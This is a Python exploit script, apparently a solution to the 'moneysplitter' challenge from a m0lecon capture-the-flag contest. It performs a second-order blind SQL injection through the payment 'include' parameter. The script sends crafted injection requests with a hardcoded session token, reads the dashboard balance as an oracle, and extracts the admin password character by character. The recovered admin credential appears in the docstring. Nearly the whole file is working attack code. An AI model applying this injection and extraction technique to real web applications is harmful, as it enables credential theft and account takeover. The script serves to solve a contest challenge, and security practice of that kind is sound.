"""
Second Order Blind SQLi

Add a payment with cost 1.0 and a boolean SQLinj in the in include parameter.
If the query returns valid results, then the owe value in the dashboard will increase. Otherwise will stay the same.

This script will extract the admin's password.
Then you can login as admin and notice the flag as a payment.
(admin:b4aad55c-e46f-4032-b1ec-4e14225f)

It would be really bad if someone deleted the flag's payment :wink:
"""
import requests
import string
import subprocess
import sys
import re

regex = r"owes[^\/]+/i> (\d+.\d+)"

def query(pwd, i=''):
    token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MDU0NjQxNTgsInVzZXJuYW1lIjoicGlwcG8iLCJ1cGRhdGVkX2F0IjoiMjAyMC0xMS0xNVQxNjo0MDoyNCIsImNyZWF0ZWRfYXQiOiIyMDIwLTExLTE1VDE2OjQwOjI0IiwiaWQiOjI3fQ.7rV33rgsD1-cz25LMsnxj7qdgpUybB2_ELn3X2jDalc"
    a = """curl -kis 'https://moneysplitter.ctf.m0lecon.it/payments/add' -H 'Origin: https://moneysplitter.ctf.m0lecon.it' -H "Cookie: x-access-token={}"  --data-raw 'reason=bbb&participants%5B73%5D%5Bcost%5D=1&participants%5B74%5D%5Bcost%5D=0&participants%5B74%5D%5Binclude%5D=(SELECT%201%20FROM%20user%20WHERE%20username%3D%27admin%27%20AND%20password%20LIKE%20%27{}{}%25%27%20LIMIT%201)'"""
    # I'm lazy
    subprocess.check_output(a.format(token, pwd, i), shell=True)
    burp0_url = "https://moneysplitter.ctf.m0lecon.it:443/dashboard/"
    burp0_cookies = {"x-access-token": token}
    r = requests.get(burp0_url, cookies=burp0_cookies)
    matches = re.search(regex, r.text, re.MULTILINE)
    if matches is None:
        return '0.0'
    return matches.group(1)

dic = ['a','b','c','d','e','f']
dic.extend(string.digits)

if len(sys.argv) == 2:
    # Manual pwnage for testing
    pwd = sys.argv[1]
    print(pwd)
    r = query(pwd)
    print(r)
    if "owes" in r:
        print(f"found: {pwd}")
    exit()

# Auto-pwn
val = "0.0"
pwd =  ""
# Apparently the password is a UUID4, so this script was optimized accordingly
tmpl = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
for i in range(len(tmpl)):
    for c in dic:
        #print(c)
        if tmpl[len(pwd)] == '-':
            pwd += '-'
            print(f"found: {pwd}")
            break
        r = query(pwd, c)
        #print(r)
        try:
            if float(r) > float(val):
                val = r
                pwd += c
                print(f"found: {pwd}")
                break
        except ValueError as e:
            print(e)
            pass
